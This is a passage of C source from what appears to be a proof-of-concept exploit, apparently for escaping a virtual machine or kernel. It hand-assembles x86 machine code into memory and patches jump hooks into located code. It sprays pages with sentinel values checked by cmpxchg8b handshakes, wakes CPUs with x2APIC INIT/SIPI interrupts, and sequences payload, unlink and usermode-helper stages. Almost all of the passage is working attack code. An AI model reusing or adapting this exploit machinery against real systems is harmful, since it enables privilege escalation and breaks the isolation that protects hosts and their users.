	uint8_t *base_low_bad, *base_high_bad, *spiv_bad, *preflight_fail;

	if (entry[0] != 0xb8 || *(uint32_t *)(entry + 1) != SPRAY_START) {
		errno = EINVAL;
		die("POC sprayer entry signature");
	}
	for (uint8_t *q = M + POC_PREFLIGHT_CODE; q < M + G1_PREFLIGHT_END;
	     q++) {
		if (*q) {
			errno = EEXIST;
			die("POC in-page code reserve");
		}
	}
	memcpy(entry_saved, entry, sizeof(entry_saved));
	memcpy(ready_saved, hook, sizeof(ready_saved));
	p = M + POC_PREFLIGHT_CODE;
	e8(&p, 0x50);
	e8(&p, 0x53);
	e8(&p, 0x51);
	e8(&p, 0x52);
	e8(&p, 0xb8);
	e32(&p, 1u);
	e8(&p, 0x0f);
	e8(&p, 0xa2);
	e8(&p, 0x0f);
	e8(&p, 0xba);
	e8(&p, 0xe1);
	e8(&p, 21u);
	has_x2apic = emit_rel32_jcc(&p, 0x82);
	emit64_store8_abs(&p, POC_WAKE_X2APIC, '!');
	e8(&p, 0x0f);
	e8(&p, 0x0b);
	patch_rel32(has_x2apic, p);
	e8(&p, 0xb9);
	e32(&p, 0x1bu);
	e8(&p, 0x0f);
	e8(&p, 0x32);
	e8(&p, 0xa9);
	e32(&p, 0x00000800u);
	apic_enabled = emit_rel32_jcc(&p, 0x85);
	emit64_store8_abs(&p, POC_WAKE_X2APIC, '!');
	e8(&p, 0x0f);
	e8(&p, 0x0b);
	patch_rel32(apic_enabled, p);
	e8(&p, 0xb8);
	e32(&p, 0xfeb00d00u);
	e8(&p, 0x31);
	e8(&p, 0xd2);
	e8(&p, 0x0f);
	e8(&p, 0x30);
	e8(&p, 0xb9);
	e32(&p, 0x1bu);
	e8(&p, 0x0f);
	e8(&p, 0x32);
	e8(&p, 0x3d);
	e32(&p, 0xfeb00d00u);
	base_low_bad = emit_rel32_jcc(&p, 0x85);
	e8(&p, 0x85);
	e8(&p, 0xd2);
	base_high_bad = emit_rel32_jcc(&p, 0x85);
	e8(&p, 0xb9);
	e32(&p, 0x80fu);
	e8(&p, 0x0f);
	e8(&p, 0x32);
	e8(&p, 0xa9);
	e32(&p, 0x00000100u);
	spiv_bad = emit_rel32_jcc(&p, 0x85);
	emit64_store8_abs(&p, POC_ACT_PREFLIGHT, 'D');
	emit64_store8_abs(&p, POC_WAKE_X2APIC, 'X');
	e8(&p, 0x5a);
	e8(&p, 0x59);
	e8(&p, 0x5b);
	e8(&p, 0x58);
	e8(&p, 0x48);
	e8(&p, 0xa1);
	e64(&p, G1_GDT);
	e8(&p, 0x48);
	e8(&p, 0xc7);
	e8(&p, 0x04);
	e8(&p, 0x25);
	e32(&p, 0xefd8u);
	e32(&p, 0);
	memcpy(p, entry_saved, sizeof(entry_saved));
	p += sizeof(entry_saved);
	resume = emit_rel32_jmp(&p);
	patch_rel32(resume, entry + sizeof(entry_saved));
	preflight_fail = p;
	emit64_store8_abs(&p, POC_ACT_FAIL, 'P');
	emit64_store8_abs(&p, POC_WAKE_X2APIC, '!');
	e8(&p, 0x0f);
	e8(&p, 0x0b);
	patch_rel32(base_low_bad, preflight_fail);
	patch_rel32(base_high_bad, preflight_fail);
	patch_rel32(spiv_bad, preflight_fail);
	if (p > M + POC_WAKE_CODE) {
		errno = EOVERFLOW;
		die("POC preflight code");
	}
	p = M + POC_WAKE_CODE;
	memcpy(p, ready_saved, sizeof(ready_saved));
	p += sizeof(ready_saved);
	e8(&p, 0x0f);
	e8(&p, 0xae);
	e8(&p, 0xf0);
	e8(&p, 0x50);
	e8(&p, 0x51);
	e8(&p, 0x52);
	e8(&p, 0xb9);
	e32(&p, 0x830u);
	e8(&p, 0xb8);
	e32(&p, 0x0000c500u);
	e8(&p, 0xba);
	e32(&p, 1u);
	e8(&p, 0x0f);
	e8(&p, 0xae);
	e8(&p, 0xf0);
	e8(&p, 0x0f);
	e8(&p, 0xae);
	e8(&p, 0xe8);
	e8(&p, 0x0f);
	e8(&p, 0x30);
	emit64_store8_abs(&p, SMP_INIT_SENT, 'I');
	e8(&p, 0xb9);
	e32(&p, 100000u);
	uint8_t *init_delay = p;

	e8(&p, 0xf3);
	e8(&p, 0x90);
	e8(&p, 0xff);
	e8(&p, 0xc9);
	e8(&p, 0x75);
	e8(&p, (uint8_t)(init_delay - (p + 1)));
	e8(&p, 0xb9);
	e32(&p, 0x830u);
	e8(&p, 0xb8);
	e32(&p, 0x00008500u);
	e8(&p, 0xba);
	e32(&p, 1u);
	e8(&p, 0x0f);
	e8(&p, 0xae);
	e8(&p, 0xf0);
	e8(&p, 0x0f);
	e8(&p, 0xae);
	e8(&p, 0xe8);
	e8(&p, 0x0f);
	e8(&p, 0x30);
	e8(&p, 0xb9);
	e32(&p, 100000u);
	uint8_t *deassert_delay = p;

	e8(&p, 0xf3);
	e8(&p, 0x90);
	e8(&p, 0xff);
	e8(&p, 0xc9);
	e8(&p, 0x75);
	e8(&p, (uint8_t)(deassert_delay - (p + 1)));
	for (int sipi = 0; sipi < 2; sipi++) {
		e8(&p, 0xb9);
		e32(&p, 0x830u);
		e8(&p, 0xb8);
		e32(&p, 0x00000600u | SMP_SIPI_VECTOR);
		e8(&p, 0xba);
		e32(&p, 1u);
		e8(&p, 0x0f);
		e8(&p, 0xae);
		e8(&p, 0xf0);
		e8(&p, 0x0f);
		e8(&p, 0xae);
		e8(&p, 0xe8);
		e8(&p, 0x0f);
		e8(&p, 0x30);
		if (!sipi) {
			e8(&p, 0xb9);
			e32(&p, 10000u);
			uint8_t *sipi_delay = p;

			e8(&p, 0xf3);
			e8(&p, 0x90);
			e8(&p, 0xff);
			e8(&p, 0xc9);
			e8(&p, 0x75);
			e8(&p, (uint8_t)(sipi_delay - (p + 1)));
		}
	}
	emit64_store8_abs(&p, SMP_SIPI_SENT, 'S');
	emit64_store8_abs(&p, POC_WAKE_SENT, 'S');
	e8(&p, 0x5a);
	e8(&p, 0x59);
	e8(&p, 0x58);
	resume = emit_rel32_jmp(&p);
	patch_rel32(resume, hook + sizeof(ready_saved));
	if (p > M + G1_PREFLIGHT_END) {
		errno = EOVERFLOW;
		die("SMP wake code");
	}
	entry[0] = 0xe9;
	patch_rel32(entry + 1, M + POC_PREFLIGHT_CODE);
	hook[0] = 0xe9;
	patch_rel32(hook + 1, M + POC_WAKE_CODE);
	memset(hook + 5, 0x90, sizeof(ready_saved) - 5u);
}

static void patch_poc_terminal_outs(void)
{
	uint8_t main_pattern[8] = { 0xc6, 0x05, 0, 0, 0, 0, 'W', 0xf4 };
	uint8_t spray_pattern[9] = { 0xc6, 0x04, 0x25, 0, 0, 0, 0, 'P', 0xf4 };
	const uint8_t zero_padding[11] = { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };
	uint8_t *main_end = M + G1_HELPER_CODE + G1_HELPER_CODE_SIZE;
	uint8_t *spray_end = M + G1_POST_CODE + 0x1000u;
	*(uint32_t *)(main_pattern + 2) = SPRAY_ARM + 24u;
	*(uint32_t *)(spray_pattern + 3) = SPRAY_ARM + 20u;
	uint8_t *main_hit = find_unique_bytes(M + G1_HELPER_CODE, main_end,
					      main_pattern,
					      sizeof(main_pattern),
					      "POC main terminal HLT");
	uint8_t *spray_hit = find_unique_bytes(M + G1_POST_CODE, spray_end,
					       spray_pattern,
					       sizeof(spray_pattern),
					       "POC spray terminal HLT");
	if (main_hit + sizeof(main_pattern) + sizeof(zero_padding) > main_end ||
	    spray_hit + sizeof(spray_pattern) + sizeof(zero_padding) >
		    spray_end) {
		errno = EOVERFLOW;
		die("POC terminal padding bounds");
	}
	if (memcmp(main_hit + sizeof(main_pattern), zero_padding,
		   sizeof(zero_padding)) ||
	    memcmp(spray_hit + sizeof(spray_pattern), zero_padding,
		   sizeof(zero_padding))) {
		errno = EEXIST;
		die("POC terminal padding");
	}
	main_hit[sizeof(main_pattern) - 1u] = 0xb0;
	main_hit[sizeof(main_pattern)] = POC_TERM_TOKEN_MAIN;
	main_hit[sizeof(main_pattern) + 1u] = 0xe6;
	main_hit[sizeof(main_pattern) + 2u] = POC_TERM_PORT_MAIN;
	main_hit[sizeof(main_pattern) + 3u] = 0xfa;
	main_hit[sizeof(main_pattern) + 4u] = 0xb0;
	main_hit[sizeof(main_pattern) + 5u] = POC_PARK_TOKEN_MAIN;
	main_hit[sizeof(main_pattern) + 6u] = 0xe6;
	main_hit[sizeof(main_pattern) + 7u] = POC_PARK_PORT_MAIN;
	main_hit[sizeof(main_pattern) + 8u] = 0xf4;
	main_hit[sizeof(main_pattern) + 9u] = 0xeb;
	main_hit[sizeof(main_pattern) + 10u] = 0xfd;
	spray_hit[sizeof(spray_pattern) - 1u] = 0xb0;
	spray_hit[sizeof(spray_pattern)] = POC_TERM_TOKEN_SPRAY;
	spray_hit[sizeof(spray_pattern) + 1u] = 0xe6;
	spray_hit[sizeof(spray_pattern) + 2u] = POC_TERM_PORT_SPRAY;
	spray_hit[sizeof(spray_pattern) + 3u] = 0xfa;
	spray_hit[sizeof(spray_pattern) + 4u] = 0xb0;
	spray_hit[sizeof(spray_pattern) + 5u] = POC_PARK_TOKEN_SPRAY;
	spray_hit[sizeof(spray_pattern) + 6u] = 0xe6;
	spray_hit[sizeof(spray_pattern) + 7u] = POC_PARK_PORT_SPRAY;
	spray_hit[sizeof(spray_pattern) + 8u] = 0xf4;
	spray_hit[sizeof(spray_pattern) + 9u] = 0xeb;
	spray_hit[sizeof(spray_pattern) + 10u] = 0xfd;
}

static void install_poc_q1_sentinel_handshake(void)
{
	uint8_t stage2_loop_pattern[26] = { 0xb8, 0,	0,    0,    0,	  0x48,
					    0xc7, 0x00, 0,    0,    0,	  0,
					    0x48, 0x05, 0x00, 0x10, 0x00, 0x00,
					    0x48, 0x3d, 0,    0,    0,	  0,
					    0x72, 0xeb };
	uint8_t arm_pattern[14] = { 0xc6, 0x05, 0, 0, 0, 0, 'A',
				    0x80, 0x3d, 0, 0, 0, 0, 'B' };
	static const uint8_t delay_pattern[] = { 0xb9, 0x80, 0xf0, 0xfa, 0x02,
						 0xf3, 0x90, 0xff, 0xc9, 0x0f,
						 0x85, 0xf6, 0xff, 0xff, 0xff };
	uint8_t *stage2_loop_hit, *stage2_store, *arm_store, *delay, *q2_store;
	uint8_t *p, *loop, *ready, *back, *retry, *fail;
	uint8_t *bad[24];
	unsigned int nbad = 0;
	*(uint32_t *)(arm_pattern + 2) = SPRAY_ARM + 16u;
	*(uint32_t *)(arm_pattern + 9) = SPRAY_ARM + 17u;
	*(uint32_t *)(stage2_loop_pattern + 1) = SPRAY2_START;
	*(uint32_t *)(stage2_loop_pattern + 20) = SPRAY2_END;
	stage2_loop_hit = find_unique_bytes(M + G1_SPRAY_CODE,
					    M + G1_SPRAY_CODE + 0x1000u,
					    stage2_loop_pattern,
					    sizeof(stage2_loop_pattern),
					    "POC Stage2 seed loop");
	stage2_store = stage2_loop_hit + 5u;
	arm_store = find_unique_bytes(M + G1_HELPER_CODE,
				      M + G1_HELPER_CODE + G1_HELPER_CODE_SIZE,
				      arm_pattern, sizeof(arm_pattern),
				      "POC Q1 arm store");
	delay = find_unique_bytes(M + G1_HELPER_CODE,
				  M + G1_HELPER_CODE + G1_HELPER_CODE_SIZE,
				  delay_pattern, sizeof(delay_pattern),
				  "POC Q1 fixed delay");
	if (delay + sizeof(delay_pattern) >
		    M + G1_HELPER_CODE + G1_HELPER_CODE_SIZE ||
	    delay != arm_store + 27u) {
		errno = EINVAL;
		die("POC Q1 arm/delay topology");
	}
	for (uint8_t *q = M + POC_Q1_SEED_CODE;
	     q < M + POC_Q1_MATCH_CODE + 0x100u; q++) {
		if (*q) {
			errno = EEXIST;
			die("POC Q1 code reserve");
		}
	}
	p = M + POC_Q1_SEED_CODE;
	e8(&p, 0xc7);
	e8(&p, 0x00);
	e32(&p, (uint32_t)POC_Q1_SENTINEL);
	e8(&p, 0xc7);
	e8(&p, 0x40);
	e8(&p, 0x04);
	e32(&p, (uint32_t)(POC_Q1_SENTINEL >> 32));
	e8(&p, 0xc3);
	if (p > M + POC_Q1_SEED_CODE + 0x100u) {
		errno = EOVERFLOW;
		die("POC Q1 seed code");
	}
	stage2_store[0] = 0xe8;
	patch_rel32(stage2_store + 1, M + POC_Q1_SEED_CODE);
	memset(stage2_store + 5, 0x90, 2);
	p = M + POC_Q1_ARM_CODE;
	e8(&p, 0x9c);
	e8(&p, 0x60);
	for (unsigned int pass = 0; pass < 2u; pass++) {
		e8(&p, 0xbe);
		e32(&p, SPRAY2_START);
		loop = p;
		e8(&p, 0xb8);
		e32(&p, (uint32_t)POC_Q1_SENTINEL);
		e8(&p, 0xba);
		e32(&p, (uint32_t)(POC_Q1_SENTINEL >> 32));
		e8(&p, 0x89);
		e8(&p, 0xc3);
		e8(&p, 0x89);
		e8(&p, 0xd1);
		e8(&p, 0xf0);
		e8(&p, 0x0f);
		e8(&p, 0xc7);
		e8(&p, 0x0e);
		bad[nbad++] = emit_rel32_jcc(&p, 0x85);
		e8(&p, 0x81);
		e8(&p, 0xc6);
		e32(&p, 0x1000u);
		e8(&p, 0x81);
		e8(&p, 0xfe);
		e32(&p, SPRAY2_END);
		back = emit_rel32_jcc(&p, 0x82);
		patch_rel32(back, loop);
	}
	emit32_store8_imm(&p, POC_Q1_ARMED, 'A');
	e8(&p, 0x0f);
	e8(&p, 0xae);
	e8(&p, 0xf0);
	e8(&p, 0x61);
	e8(&p, 0x9d);
	emit32_store8_imm(&p, SPRAY_ARM + 16u, 'A');
	e8(&p, 0xc3);
	fail = p;
	emit32_store8_imm(&p, POC_Q1_FAIL, 'A');
	emit_fail_stop_loop(&p);
	for (unsigned int i = 0; i < nbad; i++)
		patch_rel32(bad[i], fail);
	if (p > M + POC_Q1_ARM_CODE + 0x100u) {
		errno = EOVERFLOW;
		die("POC Q1 arm code");
	}
	arm_store[0] = 0xe8;
	patch_rel32(arm_store + 1, M + POC_Q1_ARM_CODE);
	memset(arm_store + 5, 0x90, 2);
	p = M + POC_Q1_WAIT_CODE;
	nbad = 0;
	e8(&p, 0x9c);
	e8(&p, 0x60);
	retry = p;
	e8(&p, 0x31);
	e8(&p, 0xed);
	e8(&p, 0x31);
	e8(&p, 0xff);
	e8(&p, 0xbe);
	e32(&p, SPRAY2_START);
	loop = p;
	e8(&p, 0xb8);
	e32(&p, (uint32_t)POC_Q1_SENTINEL);
	e8(&p, 0xba);
	e32(&p, (uint32_t)(POC_Q1_SENTINEL >> 32));
	e8(&p, 0x89);
	e8(&p, 0xc3);
	e8(&p, 0x89);
	e8(&p, 0xd1);
	e8(&p, 0xf0);
	e8(&p, 0x0f);
	e8(&p, 0xc7);
	e8(&p, 0x0e);
	ready = emit_rel32_jcc(&p, 0x84);
	e8(&p, 0x85);
	e8(&p, 0xc0);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	e8(&p, 0x81);
	e8(&p, 0xfa);
	e32(&p, (uint32_t)(POC_Q1_REPLACEMENT >> 32));
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	e8(&p, 0x45);
	e8(&p, 0x83);
	e8(&p, 0xfd);
	e8(&p, 0x01);
	bad[nbad++] = emit_rel32_jcc(&p, 0x87);
	e8(&p, 0x89);
	e8(&p, 0xf7);
	patch_rel32(ready, p);
	e8(&p, 0x81);
	e8(&p, 0xc6);
	e32(&p, 0x1000u);
	e8(&p, 0x81);
	e8(&p, 0xfe);
	e32(&p, SPRAY2_END);
	back = emit_rel32_jcc(&p, 0x82);
	patch_rel32(back, loop);
	e8(&p, 0x85);
	e8(&p, 0xed);
	uint8_t *have_one = emit_rel32_jcc(&p, 0x85);

	e8(&p, 0xf3);
	e8(&p, 0x90);
	back = emit_rel32_jmp(&p);
	patch_rel32(back, retry);
	patch_rel32(have_one, p);
	e8(&p, 0x83);
	e8(&p, 0xfd);
	e8(&p, 0x01);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	e8(&p, 0x89);
	e8(&p, 0x3d);
	e32(&p, POC_Q1_N_GPA);
	e8(&p, 0x31);
	e8(&p, 0xed);
	e8(&p, 0x31);
	e8(&p, 0xff);
	e8(&p, 0xbe);
	e32(&p, SPRAY2_START);
	loop = p;
	e8(&p, 0xb8);
	e32(&p, (uint32_t)POC_Q1_SENTINEL);
	e8(&p, 0xba);
	e32(&p, (uint32_t)(POC_Q1_SENTINEL >> 32));
	e8(&p, 0x89);
	e8(&p, 0xc3);
	e8(&p, 0x89);
	e8(&p, 0xd1);
	e8(&p, 0xf0);
	e8(&p, 0x0f);
	e8(&p, 0xc7);
	e8(&p, 0x0e);
	ready = emit_rel32_jcc(&p, 0x84);
	e8(&p, 0x85);
	e8(&p, 0xc0);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	e8(&p, 0x81);
	e8(&p, 0xfa);
	e32(&p, (uint32_t)(POC_Q1_REPLACEMENT >> 32));
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	e8(&p, 0x45);
	e8(&p, 0x83);
	e8(&p, 0xfd);
	e8(&p, 0x01);
	bad[nbad++] = emit_rel32_jcc(&p, 0x87);
	e8(&p, 0x89);
	e8(&p, 0xf7);
	patch_rel32(ready, p);
	e8(&p, 0x81);
	e8(&p, 0xc6);
	e32(&p, 0x1000u);
	e8(&p, 0x81);
	e8(&p, 0xfe);
	e32(&p, SPRAY2_END);
	back = emit_rel32_jcc(&p, 0x82);
	patch_rel32(back, loop);
	e8(&p, 0x83);
	e8(&p, 0xfd);
	e8(&p, 0x01);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	e8(&p, 0x3b);
	e8(&p, 0x3d);
	e32(&p, POC_Q1_N_GPA);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	emit32_store8_imm(&p, POC_Q1_SEEN, 'S');
	e8(&p, 0xbe);
	e32(&p, SPRAY2_START);
	loop = p;
	e8(&p, 0xb8);
	e32(&p, (uint32_t)POC_Q1_SENTINEL);
	e8(&p, 0xba);
	e32(&p, (uint32_t)(POC_Q1_SENTINEL >> 32));
	e8(&p, 0x31);
	e8(&p, 0xdb);
	e8(&p, 0x31);
	e8(&p, 0xc9);
	e8(&p, 0xf0);
	e8(&p, 0x0f);
	e8(&p, 0xc7);
	e8(&p, 0x0e);
	ready = emit_rel32_jcc(&p, 0x84);
	e8(&p, 0x85);
	e8(&p, 0xc0);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	e8(&p, 0x81);
	e8(&p, 0xfa);
	e32(&p, (uint32_t)(POC_Q1_REPLACEMENT >> 32));
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	e8(&p, 0xf0);
	e8(&p, 0x0f);
	e8(&p, 0xc7);
	e8(&p, 0x0e);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	patch_rel32(ready, p);
	e8(&p, 0x81);
	e8(&p, 0xc6);
	e32(&p, 0x1000u);
	e8(&p, 0x81);
	e8(&p, 0xfe);
	e32(&p, SPRAY2_END);
	back = emit_rel32_jcc(&p, 0x82);
	patch_rel32(back, loop);
	e8(&p, 0x0f);
	e8(&p, 0xae);
	e8(&p, 0xf0);
	e8(&p, 0xbe);
	e32(&p, SPRAY2_START);
	loop = p;
	e8(&p, 0x31);
	e8(&p, 0xc0);
	e8(&p, 0x31);
	e8(&p, 0xd2);
	e8(&p, 0x31);
	e8(&p, 0xdb);
	e8(&p, 0x31);
	e8(&p, 0xc9);
	e8(&p, 0xf0);
	e8(&p, 0x0f);
	e8(&p, 0xc7);
	e8(&p, 0x0e);
	bad[nbad++] = emit_rel32_jcc(&p, 0x85);
	e8(&p, 0x81);
	e8(&p, 0xc6);
	e32(&p, 0x1000u);
	e8(&p, 0x81);
	e8(&p, 0xfe);
	e32(&p, SPRAY2_END);
	back = emit_rel32_jcc(&p, 0x82);
	patch_rel32(back, loop);
	emit32_store8_imm(&p, POC_Q1_CLEARED, 'Z');
	e8(&p, 0x61);
	e8(&p, 0x9d);
	e8(&p, 0xc3);
	fail = p;
	emit32_store8_imm(&p, POC_Q1_FAIL, 'W');
	emit_fail_stop_loop(&p);
	for (unsigned int i = 0; i < nbad; i++)
		patch_rel32(bad[i], fail);
	if (p > M + POC_Q1_WAIT_CODE + 0x300u) {
		errno = EOVERFLOW;
		die("POC Q1 wait code");
	}
	delay[0] = 0xe8;
	patch_rel32(delay + 1, M + POC_Q1_WAIT_CODE);
	memset(delay + 5, 0x90, 10);
	uint8_t q2_pattern[6] = { 0x89, 0x3d, 0, 0, 0, 0 };
	*(uint32_t *)(q2_pattern + 2) = KS_N_GPA;
	q2_store = find_unique_bytes(M + G1_HELPER_CODE,
				     M + G1_HELPER_CODE + G1_HELPER_CODE_SIZE,
				     q2_pattern, sizeof(q2_pattern),
				     "POC Q1/Q2 lineage store");
	p = M + POC_Q1_MATCH_CODE;
	e8(&p, 0x89);
	e8(&p, 0x3d);
	e32(&p, KS_N_GPA);
	e8(&p, 0x3b);
	e8(&p, 0x3d);
	e32(&p, POC_Q1_N_GPA);
	uint8_t *match_bad = emit_rel32_jcc(&p, 0x85);

	emit32_store8_imm(&p, POC_Q1_MATCHED, 'N');
	e8(&p, 0xc3);
	fail = p;
	emit32_store8_imm(&p, POC_Q1_FAIL, 'N');
	emit_fail_stop_loop(&p);
	patch_rel32(match_bad, fail);
	if (p > M + POC_Q1_MATCH_CODE + 0x100u) {
		errno = EOVERFLOW;
		die("POC Q1 match code");
	}
	q2_store[0] = 0xe8;
	patch_rel32(q2_store + 1, M + POC_Q1_MATCH_CODE);
	q2_store[5] = 0x90;
	printf("[POC-Q1-BUILD] seed=%#x arm=%#x wait=%#x hooks=%#x/%#x/%#x sentinel=%#llx replacement=%#llx\n",
	       POC_Q1_SEED_CODE, POC_Q1_ARM_CODE, POC_Q1_WAIT_CODE,
	       (unsigned int)(stage2_store - M), (unsigned int)(arm_store - M),
	       (unsigned int)(delay - M), (unsigned long long)POC_Q1_SENTINEL,
	       (unsigned long long)POC_Q1_REPLACEMENT);
}

static void install_poc_printk_activation(void)
{
	uint8_t monitor_pattern[12] = { 0xb8, 0,    0,	  0,	0,    0x31,
					0xc9, 0x31, 0xd2, 0x0f, 0x01, 0xc8 };
	uint8_t enter_pattern[10] = { 0xc6, 0x05, 0,	0,    0,
				      0,    'M',  0x0f, 0xae, 0xf0 };
	uint8_t queued_pattern[8] = { 0x80, 0x3c, 0x25, 0, 0, 0, 0, 'Q' };
	uint8_t *monitor, *queued, *p, *back;
	uint8_t *post_monitor;
	*(uint32_t *)(monitor_pattern + 1) = G1_MARKER;
	*(uint32_t *)(enter_pattern + 2) = POC_MONITOR_ENTERED;
	*(uint32_t *)(queued_pattern + 3) = KS_WORK_QUEUED;
	monitor = find_unique_bytes(M + G1_HELPER_CODE,
				    M + G1_HELPER_CODE + G1_HELPER_CODE_SIZE,
				    monitor_pattern, sizeof(monitor_pattern),
				    "POC MONITOR sequence");
	queued = find_unique_bytes(M + G1_POST_CODE, M + G1_POST_CODE + 0x1000u,
				   queued_pattern, sizeof(queued_pattern),
				   "POC queued wait activation hook");
	if (monitor < M + G1_HELPER_CODE + sizeof(enter_pattern) ||
	    memcmp(monitor - sizeof(enter_pattern), enter_pattern,
		   sizeof(enter_pattern)) ||
	    monitor + 17u > M + G1_HELPER_CODE + G1_HELPER_CODE_SIZE ||
	    monitor[12] != 0xe9 ||
	    monitor + 17u + *(int32_t *)(monitor + 13u) !=
		    M + POC_MONITOR_CODE) {
		errno = EINVAL;
		die("POC MONITOR return trampoline signature");
	}
	if (queued + 21u > M + G1_POST_CODE + 0x1000u || queued[8] != 0x0f ||
	    queued[9] != 0x84 || queued[14] != 0xf3 || queued[15] != 0x90 ||
	    queued[16] != 0xe9) {
		errno = EINVAL;
		die("POC queued wait signature");
	}
	for (uint8_t *q = M + POC_MONITOR_CODE;
	     q < M + POC_ACT_CODE + POC_ACT_SIZE; q++) {
		if (*q) {
			errno = EEXIST;
			die("POC activation code reserve");
		}
	}
	p = M + POC_MONITOR_CODE;
	emit32_store8_imm(&p, POC_MONITOR_RETURNED, 'R');
	e8(&p, 0x0f);
	e8(&p, 0xae);
	e8(&p, 0xf0);
	post_monitor = emit_rel32_jmp(&p);
	patch_rel32(post_monitor, monitor + 17u);
	if (p > M + POC_ACT_CODE) {
		errno = EOVERFLOW;
		die("POC MONITOR return code");
	}
	p = M + POC_ACT_CODE;
	emit64_wait_byte(&p, POC_MONITOR_ENTERED, 'M');
	emit64_wait_byte(&p, POC_MONITOR_RETURNED, 'R');
	emit64_store8_abs(&p, POC_ACT_ARMED, 'I');
	e8(&p, 0x0f);
	e8(&p, 0xae);
	e8(&p, 0xf0);
	e8(&p, 0x50);
	e8(&p, 0x51);
	e8(&p, 0x52);
	e8(&p, 0xb9);
	e32(&p, 0x830u);
	e8(&p, 0xb8);
	e32(&p, POC_ACT_ICR_LOW);
	e8(&p, 0xba);
	e32(&p, 0xffu);
	e8(&p, 0x0f);
	e8(&p, 0x30);
	e8(&p, 0x5a);
	e8(&p, 0x59);
	e8(&p, 0x58);
	emit64_store8_abs(&p, POC_ACT_DONE, 'P');
	e8(&p, 0x0f);
	e8(&p, 0xae);
	e8(&p, 0xf0);
	e8(&p, 0x8b);
	e8(&p, 0x3c);
	e8(&p, 0x25);
	e32(&p, KS_PAY_GPA);
	uint8_t *bsp_complete_wait = p;

	e8(&p, 0x8b);
	e8(&p, 0x87);
	e32(&p, KHP_W + 32u);
	e8(&p, 0x85);
	e8(&p, 0xc0);
	uint8_t *bsp_complete_low_nonzero = emit_rel32_jcc(&p, 0x85);

	e8(&p, 0x8b);
	e8(&p, 0x87);
	e32(&p, KHP_W + 36u);
	e8(&p, 0x85);
	e8(&p, 0xc0);
	uint8_t *bsp_complete_high_nonzero = emit_rel32_jcc(&p, 0x85);
	uint8_t *bsp_complete_seen = emit_rel32_jmp(&p);
	uint8_t *bsp_complete_retry = p;

	e8(&p, 0xf3);
	e8(&p, 0x90);
	uint8_t *bsp_complete_back = emit_rel32_jmp(&p);

	patch_rel32(bsp_complete_back, bsp_complete_wait);
	patch_rel32(bsp_complete_low_nonzero, bsp_complete_retry);
	patch_rel32(bsp_complete_high_nonzero, bsp_complete_retry);
	patch_rel32(bsp_complete_seen, p);
	uint8_t *bsp_rescue_bad[4];
	unsigned int nbsp_rescue_bad = 0;

	emit64_atomic_rescue_work_func(&p, bsp_rescue_bad, &nbsp_rescue_bad);
	emit64_atomic_release_completion(&p, 'B', bsp_rescue_bad,
					 &nbsp_rescue_bad);
	uint8_t *bsp_rescue_good = emit_rel32_jmp(&p);
	uint8_t *bsp_rescue_fail = p;

	emit64_store8_abs(&p, SPRAY_ARM + 48u, 'v');
	e8(&p, 0xfa);
	uint8_t *bsp_fail_hlt = p;

	e8(&p, 0xf4);
	uint8_t *bsp_fail_back = emit_rel32_jmp(&p);

	patch_rel32(bsp_fail_back, bsp_fail_hlt);
	for (unsigned int i = 0; i < nbsp_rescue_bad; i++)
		patch_rel32(bsp_rescue_bad[i], bsp_rescue_fail);
	patch_rel32(bsp_rescue_good, p);
	emit64_wait_byte(&p, KS_UNLINK_ARM, 'U');
	e8(&p, 0x50);
	e8(&p, 0x51);
	e8(&p, 0x52);
	e8(&p, 0xb9);
	e32(&p, 0x830u);
	e8(&p, 0xb8);
	e32(&p, POC_ACT_ICR_LOW);
	e8(&p, 0xba);
	e32(&p, 0xffu);
	e8(&p, 0x0f);
	e8(&p, 0x30);
	e8(&p, 0x5a);
	e8(&p, 0x59);
	e8(&p, 0x58);
	emit64_store8_abs(&p, KS_UNLINK_ICR, 'I');
	e8(&p, 0x0f);
	e8(&p, 0xae);
	e8(&p, 0xf0);
	emit64_wait_byte(&p, KS_UMH_COMPLETE, 'E');
	back = emit_rel32_jmp(&p);
	patch_rel32(back, queued + 21u);
	if (p > M + POC_ACT_CODE + POC_ACT_SIZE) {
		errno = EOVERFLOW;
		die("POC activation code");
	}
	queued[0] = 0xe9;
	patch_rel32(queued + 1, M + POC_ACT_CODE);
	memset(queued + 5, 0x90, 16u);
	printf("[POC-ACT-BUILD] MONITOR=%#x preserved return-code=%#x markers=%#x/%#x queued-hook=%#x ICR-code=%#x ICR=%#x sequence=MONITOR->ICR mode=%s\n",
	       (unsigned int)(monitor - M), POC_MONITOR_CODE,
	       POC_MONITOR_ENTERED, POC_MONITOR_RETURNED,
	       (unsigned int)(queued - M), POC_ACT_CODE, POC_ACT_ICR_LOW,
	       "printk");
}

static void emit_store_edx_abs(uint8_t **pp, uint32_t addr)
{
	uint8_t *p = *pp;

	e8(&p, 0x89);
	e8(&p, 0x15);
	e32(&p, addr);
	*pp = p;
}

static bool is_generated_abs_operand(const uint8_t *begin, const uint8_t *p)
{
	if (p >= begin + 1 && (p[-1] == 0xa1 || p[-1] == 0xa3))
		return true;
	if (p >= begin + 2 && p[-1] == 0x05 && (p[-2] == 0xc7 || p[-2] == 0xc6))
		return true;
	if (p >= begin + 2 && p[-1] == 0x05 && (p[-2] == 0x0b || p[-2] == 0x3b))
		return true;
	if (p >= begin + 4 && p[-4] == 0xf0 && p[-3] == 0x0f && p[-2] == 0xc7 &&
	    p[-1] == 0x0d)
		return true;
	return false;
}

static int operand_reloc_kind(uint32_t value)
{
	if (value >= TARGET_C_BASE && value <= TARGET_C_BASE + 164u &&
	    !((value - TARGET_C_BASE) & 3u))
		return 1;
	if (value >= TARGET_PAGE_BASE + HOST_F_OFF &&
	    value <= TARGET_PAGE_BASE + 0x4ffu && !(value & 3u))
		return 2;
	return 0;
}

static void append_c_reloc(uint32_t operand_gpa)
{
	uint32_t *list = (uint32_t *)(M + RELOC_C_LIST_GPA);

	if (expected_c_relocs >= RELOC_MAX) {
		errno = EOVERFLOW;
		die("relocation table");
	}
	for (uint32_t i = 0; i < expected_c_relocs; i++)
